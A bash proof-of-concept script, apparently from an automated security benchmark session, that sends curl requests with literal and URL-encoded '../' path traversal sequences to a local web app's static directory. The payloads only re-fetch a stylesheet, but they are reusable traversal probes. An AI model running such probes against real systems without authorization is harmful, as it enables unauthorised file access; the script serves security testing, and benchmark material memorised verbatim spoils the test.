#!/bin/bash
# POC: Tests URL-encoded path traversal with detailed response analysis
# Target: ./repo
# Created: 2025-11-06T21:45:10.331Z
# Session: benchmark-XBEN-065-24-mhny77r3

# URL-Encoded Path Traversal POC v3
# Test if application processes URL encoding differently

TARGET_HOST="${1:-localhost}"
TARGET_PORT="${2:-5001}"
BASE_URL="http://${TARGET_HOST}:${TARGET_PORT}"

echo "========================================"
echo "URL-Encoded Path Traversal POC v3"
echo "Testing application behavior"
echo "========================================"
echo "Target: $BASE_URL"
echo ""

# First, verify the literal traversal still works (as baseline)
echo "[BASELINE] Testing literal ../traversal:"
curl -s -i "$BASE_URL/static/../static/css/style.css" 2>&1 | head -n 1
echo ""

# Test URL encoding without leading slash
echo "[TEST 1] Testing %2e%2e at different positions:"
curl -s -i "$BASE_URL/static%2f%2e%2e%2fstatic%2fcss%2fstyle.css" 2>&1 | head -n 1
echo ""

# Test with mixed encoding
echo "[TEST 2] Testing mixed encoding (encoded dots, literal slashes):"
curl -s -i "$BASE_URL/static/%2e%2e/static/css/style.css" 2>&1 | head -n 1
echo ""

# Test without /static prefix
echo "[TEST 3] Direct encoded traversal:"
curl -s -i "$BASE_URL/%2e%2e/static/css/style.css" 2>&1 | head -n 1
echo ""

# Test full path encoding
echo "[TEST 4] Fully encoded path:"
curl -s -i "$BASE_URL/static/%2e%2e%2fstatic%2fcss%2fstyle.css" 2>&1 | head -n 1
echo ""

# Print detailed response for literal traversal (should work)
echo "========================================"
echo "[DETAILED] Literal traversal response:"
echo "========================================"
curl -v "$BASE_URL/static/../static/css/style.css" 2>&1 | head -n 20
echo ""

echo "========================================"
echo "[DETAILED] URL-encoded traversal response:"
echo "========================================"
curl -v "$BASE_URL/static/%2e%2e/static/css/style.css" 2>&1 | head -n 20
echo ""